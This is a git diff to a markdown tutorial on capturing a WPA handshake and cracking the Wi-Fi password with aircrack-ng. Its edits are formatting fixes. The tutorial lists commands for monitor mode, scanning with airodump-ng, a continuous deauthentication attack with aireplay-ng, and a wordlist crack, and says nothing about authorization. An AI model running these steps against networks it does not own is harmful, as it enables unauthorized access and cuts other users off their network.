@@ -9,7 +9,7 @@ Read that first.
 ## Prerequisites
 List what the user needs before they start:
 * **Hardware:**
-    * Wireless network adapter capable of monitor mode and packet injection (e.g., Alfa AWUS036NHA).
+    * Wireless network adapter capable of monitor mode and packet injection.
 * **Software:**
     * Any linux distro with sudo permissions.
     * aircrack-ng suite
@@ -23,9 +23,9 @@ Instructions for any initial setup:
 2.  Ensuring your wireless adapter is recognized and can be put into monitor mode.
     * `ifconfig`
     * `ifconfig [wireless interface, eg wlan0]`
-      `![Monitor Mode Activation](images/ifconfig.png)`
+      ![Monitor Mode Activation](images/ifconfig.png)
     * `sudo airmon-ng start wlan0`
-       `![Monitor Mode Activation](images/monitor_mode.png)`
+       ![Monitor Mode Activation](images/monitor_mode.png)
 
 ## Tutorial Steps
 
@@ -33,25 +33,25 @@ Instructions for any initial setup:
 1. `sudo airodump-ng wlan0`
 2.  It will show you all the wifi networks in your vicinity
 3.  What to look for BSSID, CH, ESSID of the target network.
-        * Example: `![Airodump Scan](images/airodump.png)`
+        * Example: ![Airodump Scan](images/airodump.png)
 
 ### Step 2: Capturing the Handshake
 1.  `sudo airodump-ng -c [channel] --bssid [BSSID] --write capture wlan0`.
-    * Example: `![Handshake Capture](images/handshake.png)`
+    * Example: ![Handshake Capture](images/handshake.png)
 2.  (Optional) Deauthenticating a client to speed up handshake capture.
     * `sudo aireplay-ng --deauth 0 -a [BSSID] wlan0`
-        * Example: `![Deauth Attack](images/deauth.png)`
+        * Example: ![Deauth Attack](images/deauth.png)
 
 ### Step 3: Cracking the Password
 Brute-force attack.
 1.  Using Aircrack-ng with a wordlist:
     *`aircrack-ng [capturefile.cap] -w [path to wordlist]`).
-    * Example: `![Aircrack Success](images/aircrack.png)`
+    * Example: ![Aircrack Success](images/aircrack.png)
 
 
 ### Step 4: [Cleanup]
 1.  Well we found the key
 2.  `sudo airmon-ng stop wlan0mon` and `sudo systemctl restart NetworkManager`
-     * Example: `![Network Restored](images/restored.png)
+     * Example: ![Network Restored](images/restored.png)
 
         
